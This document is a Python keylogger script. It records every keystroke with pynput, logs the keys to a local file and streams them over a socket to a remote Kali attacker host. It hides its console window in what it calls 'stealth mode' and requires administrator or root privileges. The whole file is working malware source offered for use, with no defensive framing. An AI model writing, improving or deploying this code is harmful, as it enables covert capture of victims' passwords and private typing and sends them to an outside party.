import os
import platform
import logging
import socket
import threading
from pynput import keyboard

# Configurations for remote server
REMOTE_SERVER_IP = "KALI_IP_ADDRESS"  # Replace with the Kali Linux IP
REMOTE_SERVER_PORT = 5555            # Choose an open port for communication

# Set up logging
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Global variables to track key combinations
current_keys = set()

# Socket for sending data
client_socket = None

def check_root_access():
    """Checks if the script is running with administrator/root privileges."""
    if platform.system() == "Windows":
        try:
            is_admin = os.getuid() == 0  # Throws an AttributeError on Windows
        except AttributeError:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin
    elif platform.system() == "Linux":
        return os.geteuid() == 0
    else:
        return False

def establish_remote_connection():
    """Establish a socket connection to the remote Kali server."""
    global client_socket
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((REMOTE_SERVER_IP, REMOTE_SERVER_PORT))
        logging.info("Connected to remote server")
    except Exception as e:
        logging.error(f"Failed to connect to remote server: {e}")

def send_to_remote_server(data):
    """Send the logged data to the remote server."""
    if client_socket:
        try:
            client_socket.sendall(data.encode('utf-8'))
        except Exception as e:
            logging.error(f"Failed to send data: {e}")

def log_key_press(key):
    """Callback function that logs each key press and handles key combinations."""
    global current_keys

    try:
        if key.char:  # If it's a regular character
            current_keys.add(key.char)
            logged = '+'.join(current_keys)
            logging.info(logged)
            send_to_remote_server(logged)
    except AttributeError:
        # Handle special keys (Ctrl, Alt, etc.)
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            current_keys.add("Ctrl")
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            current_keys.add("Shift")
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            current_keys.add("Alt")
        else:
            logging.info(f"Special key: {key}")
            send_to_remote_server(str(key))

def log_key_release(key):
    """Callback function to handle key releases and clear key combinations."""
    global current_keys

    try:
        if key.char and key.char in current_keys:
            current_keys.remove(key.char)
    except AttributeError:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            current_keys.discard("Ctrl")
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            current_keys.discard("Shift")
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            current_keys.discard("Alt")

    ### Stop the keylogger if Escape is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Starts the keylogger and listens for key presses."""
    with keyboard.Listener(on_press=log_key_press, on_release=log_key_release) as listener:
        listener.join()

def hide_console():
    """Hide the console window in Windows or suppress output in Linux."""
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif platform.system() == "Linux":
        # Suppressing output (redirect stdout and stderr)
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

def main():
    """Main function to start the keylogger."""
    if not check_root_access():
        print("[-] This keylogger must be run as an administrator or root.")
        return

    # Hide the console window (stealth mode)
    hide_console()

    # Connect to remote server
    establish_remote_connection()

    # Start the keylogger
    print("[+] Keylogger running with root access.")
    start_keylogger()

if __name__ == "__main__":
    main()
